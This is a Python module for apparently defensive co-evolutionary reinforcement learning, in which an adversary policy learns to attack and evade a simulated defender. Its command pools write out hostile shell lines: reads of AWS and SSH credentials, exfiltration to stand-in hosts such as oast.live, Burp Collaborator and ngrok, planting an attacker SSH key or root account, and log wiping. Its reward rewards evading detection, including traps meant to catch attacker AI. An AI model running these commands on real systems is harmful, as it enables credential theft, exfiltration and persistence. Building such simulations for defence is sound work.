"""Adversary policy — the attacker side of co-evolutionary RL.

The defender (`PolicyNet` in policy_net.py) is trained against a hand-
coded `AttackerSim` (recon-heavy / smash-and-grab / persistence-first /
balanced archetypes). That gets a defender that's good at the
attackers we *imagined*. To get one good at attackers we *didn't*
imagine, we close the loop: train a second policy that plays the
attacker side, reward it for evading our defender, and iterate.

This module owns:

  * **`AttackerAction` (10 classes)** — high-level attacker intents.
    Each class samples one concrete command from a pool when the
    co-evolution loop materializes it.

  * **`AdversaryNet`** — separate REINFORCE net (linear softmax or
    1-hidden MLP) outputting a probability over the 10 action classes.

  * **`AttackerState`** — per-episode state the adversary observes:
    progress, action-class usage mask, recent-action one-hot,
    session counters, isolation flag.

  * **`attacker_reward()`** — rewards survival + objective completion
    (credential reads, persistence, exfil), penalizes detection
    (alerts fired, counter-AI trap sprung, isolation).

The CoevolutionLoop in `coevolve.py` orchestrates training; this
module just provides the policy + reward.
"""
from __future__ import annotations

import random
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

import numpy as np

from .policy_net import PolicyHparams, PolicyNet


# ---------------------------------------------------------------------------
# Attacker action space — 10 high-level intent classes
# ---------------------------------------------------------------------------

ATTACKER_ACTIONS: List[str] = [
    "recon_basic",          # 0  — whoami / id / hostname / uname
    "recon_filesystem",     # 1  — ls -la /, cat /etc/passwd, find ...
    "cred_hunt_aws",        # 2  — cat ~/.aws/*, grep AKIA
    "cred_hunt_ssh",        # 3  — find id_rsa, cat ~/.ssh/*
    "decoy_followup",       # 4  — cat /etc/sudoers.d/*, cat /etc/mysql/my.cnf
    "lateral_attempt",      # 5  — ssh db-prod-01, ssh api-prod-03
    "exfil_dns",            # 6  — curl x.oast.live, dig data.exfil.live
    "persistence",          # 7  — echo ssh-rsa >> ~/.ssh/authorized_keys
    "cleanup",              # 8  — history -c, > /var/log/auth.log
    "leave",                # 9  — exit
]

# Concrete commands per class. Co-evolution loop samples uniformly.
_COMMAND_POOLS: Dict[str, List[str]] = {
    "recon_basic": [
        "whoami", "id", "hostname", "uname -a", "pwd",
        "uptime", "w", "who",
    ],
    "recon_filesystem": [
        "ls -la /", "ls -la /home", "ls /tmp", "ls /etc",
        "cat /etc/passwd", "cat /etc/issue", "cat /etc/os-release",
        "df -h", "free -h", "ps aux",
    ],
    "cred_hunt_aws": [
        "cat /home/jdoe/.aws/credentials",
        "cat /home/jdoe/.aws/config",
        "grep -r AKIA /home/jdoe 2>/dev/null",
        "ls -la /home/jdoe/.aws/",
    ],
    "cred_hunt_ssh": [
        "find / -name id_rsa 2>/dev/null",
        "cat /home/jdoe/.ssh/id_rsa",
        "cat /home/jdoe/.ssh/config",
        "ls -la /home/jdoe/.ssh/",
        "cat /home/jdoe/.ssh/authorized_keys",
    ],
    "decoy_followup": [
        "ls /etc/sudoers.d/",
        "cat /etc/sudoers.d/zzz_compat",
        "cat /etc/mysql/my.cnf",
        "cat /home/jdoe/.aws/dev_credentials",
        "ls /etc/mysql",
    ],
    "lateral_attempt": [
        "ssh db-prod-01",
        "ssh api-prod-03",
        "ssh bastion-prod",
        "scp /tmp/loot.txt root@bastion-prod:/tmp/",
        "psql -h db-prod-01 -U postgres",
    ],
    "exfil_dns": [
        "curl https://attacker.x.oast.live/$(whoami)",
        "dig +short data.exfil.x.oast.live",
        "nslookup AAAA.exfil.burpcollaborator.net",
        "wget http://abc.burpcollaborator.net/$(id)",
        "curl -X POST https://x.ngrok.io/k -d \"$(cat ~/.aws/credentials)\"",
    ],
    "persistence": [
        "echo 'ssh-rsa AAAA...attacker@evil' >> /home/jdoe/.ssh/authorized_keys",
        "sudo -i",
        "sudo bash",
        "echo 'attacker:x:0:0::/root:/bin/bash' >> /etc/passwd",
    ],
    "cleanup": [
        "history -c",
        "unset HISTFILE",
        "rm /var/log/auth.log",
        "> /home/jdoe/.bash_history",
        "shred -u /tmp/loot.txt",
    ],
    "leave": [
        "exit",
    ],
}


def sample_command(action_idx: int, rng: random.Random) -> str:
    """Pick one concrete command from the action-class's pool."""
    name = ATTACKER_ACTIONS[action_idx]
    return rng.choice(_COMMAND_POOLS[name])


# ---------------------------------------------------------------------------
# Attacker observation — what the adversary policy sees
# ---------------------------------------------------------------------------

@dataclass
class AttackerState:
    """Per-episode adversary state. Mutated in-place by the co-evolution
    loop. `vectorize()` produces the obs vector the policy consumes.

    Observation layout (23 dims):
        [0]      progress = step_count / max_steps
        [1..11]  bitmask: action-class i has been used this episode
        [11..21] one-hot: last action class
        [21]     credential_reads (clamped /5)
        [22]     isolated flag (0/1)
    """
    max_steps: int = 30
    step_count: int = 0
    used_mask: List[int] = field(default_factory=lambda: [0] * 10)
    last_action: int = -1
    credential_reads: int = 0
    isolated: bool = False
    # Telemetry only — not in obs vector
    history: List[Tuple[int, str]] = field(default_factory=list)

    def vectorize(self) -> np.ndarray:
        v = np.zeros(23, dtype=np.float64)
        v[0] = self.step_count / max(1, self.max_steps)
        for i, used in enumerate(self.used_mask):
            v[1 + i] = float(used)
        if 0 <= self.last_action < 10:
            v[11 + self.last_action] = 1.0
        v[21] = min(self.credential_reads, 5) / 5.0
        v[22] = 1.0 if self.isolated else 0.0
        return v

    def record_action(self, action_idx: int, cmd: str) -> None:
        self.step_count += 1
        if 0 <= action_idx < 10:
            self.used_mask[action_idx] = 1
        self.last_action = action_idx
        self.history.append((action_idx, cmd))


# ---------------------------------------------------------------------------
# AdversaryNet — separate REINFORCE policy (reuses PolicyNet plumbing)
# ---------------------------------------------------------------------------

@dataclass
class AdversaryHparams:
    obs_dim: int = 23
    n_actions: int = len(ATTACKER_ACTIONS)   # 10
    hidden_dim: int = 0
    learning_rate: float = 0.02
    entropy_beta: float = 0.02   # higher than defender — encourage exploration
    seed: int = 7


class AdversaryNet:
    """Wraps `PolicyNet` with the adversary's action/obs sizes. We
    duck-type rather than subclass — `forward/sample/greedy/update`
    are the same shape; the underlying math is identical."""

    def __init__(self, hp: Optional[AdversaryHparams] = None):
        self.hp = hp or AdversaryHparams()
        # Reuse PolicyNet by passing equivalent hparams
        from .policy_net import PolicyHparams as _PHp
        underlying = _PHp(
            obs_dim=self.hp.obs_dim,
            n_actions=self.hp.n_actions,
            hidden_dim=self.hp.hidden_dim,
            learning_rate=self.hp.learning_rate,
            entropy_beta=self.hp.entropy_beta,
            seed=self.hp.seed,
        )
        self._net = PolicyNet(underlying)

    # Delegate the contract surface
    def forward(self, obs):  return self._net.forward(obs)
    def sample(self, obs, rng):  return self._net.sample(obs, rng)
    def greedy(self, obs):  return self._net.greedy(obs)
    def update(self, traj):  return self._net.update(traj)
    def save(self, path):   self._net.save(path)

    @classmethod
    def load(cls, path) -> "AdversaryNet":
        # Inverse of save — reconstitute via the underlying PolicyNet.
        inner = PolicyNet.load(path)
        hp = AdversaryHparams(
            obs_dim=inner.hp.obs_dim,
            n_actions=inner.hp.n_actions,
            hidden_dim=inner.hp.hidden_dim,
            learning_rate=inner.hp.learning_rate,
            entropy_beta=inner.hp.entropy_beta,
        )
        out = cls.__new__(cls)
        out.hp = hp
        out._net = inner
        return out


# ---------------------------------------------------------------------------
# Attacker reward — co-evolution shaping
# ---------------------------------------------------------------------------

@dataclass
class AttackerRewardWeights:
    """Tunable shaping. The attacker is rewarded for being a successful
    attacker (cred reads, persistence, exfil, long dwell) and penalized
    for being a DETECTED attacker (alerts, isolation, trap leaks)."""
    dwell_per_step: float          = 0.20
    credential_read:    float      = 5.0
    persistence_success: float     = 6.0
    exfil_success:      float      = 5.0
    clean_exit_bonus:   float      = 8.0    # exits with ≥3 cred reads, no isolation

    # Penalties
    per_alert_fired:    float      = -1.5
    isolated:           float      = -10.0
    counter_ai_detected: float     = -8.0   # generic detector hit
    counter_ai_proven:  float      = -15.0  # trap marker actually leaked

    # Behavior shaping
    repeated_action:    float      = -0.5   # discourage spamming one action
    leave_too_early:    float      = -2.0   # exit before reading any creds


def attacker_reward(
    *,
    prev_observed: Dict[str, Any],
    new_observed: Dict[str, Any],
    new_alerts: List[Dict[str, Any]],
    attacker_state: AttackerState,
    action_idx: int,
    weights: Optional[AttackerRewardWeights] = None,
) -> float:
    """Single-step attacker reward.

    Inputs reflect the same data the defender reward uses, plus the
    attacker's own state and chosen action. Symmetry note: this is NOT
    just `-defender_reward` — the attacker has its own objective shape
    (successful exfil with no detection), which doesn't always invert
    cleanly. Zero-sum games converge faster but hand-shaped rewards
    train more reliably on small numbers of episodes.
    """
    w = weights or AttackerRewardWeights()
    r = w.dwell_per_step

    # Compute set deltas — the "good for attacker" outcomes
    def _new(key: str) -> int:
        old = prev_observed.get(key, set()) or set()
        new = new_observed.get(key, set()) or set()
        if isinstance(old, list): old = set(old)
        if isinstance(new, list): new = set(new)
        return len(new - old)

    cred_delta = _new("credential_files_read")
    r += cred_delta * w.credential_read
    if cred_delta > 0:
        attacker_state.credential_reads += cred_delta

    if new_observed.get("ssh_persistence_attempt") and not prev_observed.get("ssh_persistence_attempt"):
        r += w.persistence_success
    if new_observed.get("dns_exfil_attempted") and not prev_observed.get("dns_exfil_attempted"):
        r += w.exfil_success

    # ALERT PENALTIES — every alert this step costs the attacker
    for a in new_alerts:
        r += w.per_alert_fired
        if a.get("action") == "alert_attacker_llm_detected":
            r += w.counter_ai_detected
        if a.get("action") == "isolate_session":
            r += w.isolated
            attacker_state.isolated = True

    # Counter-AI trap proven (highest-confidence detection)
    if new_observed.get("attacker_llm_proven_via_trap") and not prev_observed.get("attacker_llm_proven_via_trap"):
        r += w.counter_ai_proven

    # Behavior shaping — don't spam the same action class
    if attacker_state.last_action == action_idx and action_idx not in (9,):  # exit allowed
        r += w.repeated_action

    return r


def terminal_attacker_reward(
    *,
    final_state: AttackerState,
    final_observed: Dict[str, Any],
    isolated: bool,
    weights: Optional[AttackerRewardWeights] = None,
) -> float:
    """One-shot end-of-episode reward. Big positive bonus for an
    actually-successful covert engagement; penalty for bailing too early."""
    w = weights or AttackerRewardWeights()
    r = 0.0
    if not isolated and final_state.credential_reads >= 3:
        r += w.clean_exit_bonus
    if final_state.credential_reads == 0 and final_state.step_count < 5:
        r += w.leave_too_early
    return r
